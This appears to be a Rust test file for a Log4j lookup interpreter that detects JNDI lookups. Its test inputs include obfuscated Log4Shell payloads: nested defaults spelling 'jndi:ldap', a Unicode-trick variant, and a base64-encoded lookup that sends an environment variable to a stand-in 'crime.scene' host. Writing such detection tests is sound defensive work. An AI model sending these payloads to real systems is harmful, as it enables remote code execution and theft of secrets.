use log4j_interpreter::parse_str;

fn parseu(input: &str) -> String {
    parse_str(input, 3).unwrap()
}

#[test]
fn partial_escape() {
    assert_eq!("hi$$there", parseu("hi$$there"));
}
#[test]
fn full_escape() {
    assert_eq!("hi${there", parseu("hi$${there"));
}
#[test]
fn partial_substitute() {
    assert_eq!("hi${lower:X", parseu("hi${lower:X"));
}
#[test]
fn full_substitute() {
    assert_eq!("hixthere", parseu("hi${lower:X}there"));
}
#[test]
fn nested_substitute() {
    assert_eq!("hiTHERE", parseu("hi${upper:th${lower:ERE}}"));
}
#[test]
fn obfuscated() {
    let input = "${\
        ${uPBeLd:JghU:kyH:C:TURit:-j}\
        ${odX:t:STGD:UaqOvq:wANmU:-n}\
        ${mgSejH:tpr:zWlb:-d}\
        ${ohw:Yyz:OuptUo:gTKe:BFxGG:-i}\
        ${fGX:L:KhSyJ:-:}\
        ${E:o:wsyhug:LGVMcx:-l}\
        ${Prz:-d}\
        ${d:PeH:OmFo:GId:-a}\
        ${NLsTHo:-p}\
        ${uwF:eszIV:QSvP:-:}\
        ${JF:l:U:-/}\
        ${AyEC:rOLocm:-/}\
    }";
    assert_eq!("FORBIDDEN_JNDI", parseu(input));
}
#[test]
fn unicode_obfuscated() {
    assert_eq!(
        "does this get blocked? FORBIDDEN_JNDI",
        // note: the next line intentionally uses a unicode character
        parseu("does this get blocked? ${jnd${lower:${upper:ı}}:ldap://whatever}")
    );
}
#[test]
fn default_dollar() {
    assert_eq!("$", parseu("${::-$}"));
}
#[test]
fn complex_default_dollar() {
    assert_eq!("$hello", parseu("${::-$hello}"));
}
#[test]
fn obfuscated_dollar() {
    assert_eq!(
        "hello FORBIDDEN_JNDI",
        parseu("hello ${lower:${::-$}{jndi:}}")
    )
}
#[test]
fn obfuscate_everything() {
    let input = "${::-${::-$}{::}${::--}${::-hi}}";
    assert_eq!("hi", parseu(input));
}
#[test]
fn what_does_this_do() {
    let input = "what's that ${::-$}{${::-j}ndi:${::-l}dap:}";
    assert_eq!("what's that FORBIDDEN_JNDI", parseu(input));
}
#[test]
fn base64() {
    let evil = base64::encode("${jndi:ldap:${env:user}.crime.scene/a}");
    let input = format!("all your base64 are ${{base64:{}}}", evil);
    assert_eq!("all your base64 are FORBIDDEN_JNDI", parseu(&input));

    let harmless = base64::encode("completely harmless text");
    let input = format!("this is ${{base64:{}}}", harmless);
    assert_eq!("this is completely harmless text", parseu(&input));
}
#[test]
fn two_default_delimiters() {
    let input = "${::-:-}";
    assert_eq!(":-", parseu(input));
}
#[test]
fn much_nesting() {
    let input = "${::-h${::-e${::-l${::-l${::-o ${base64:YWRhbQ==}}}}}}";
    assert_eq!("hello adam", parse_str(input, 6).unwrap());
}
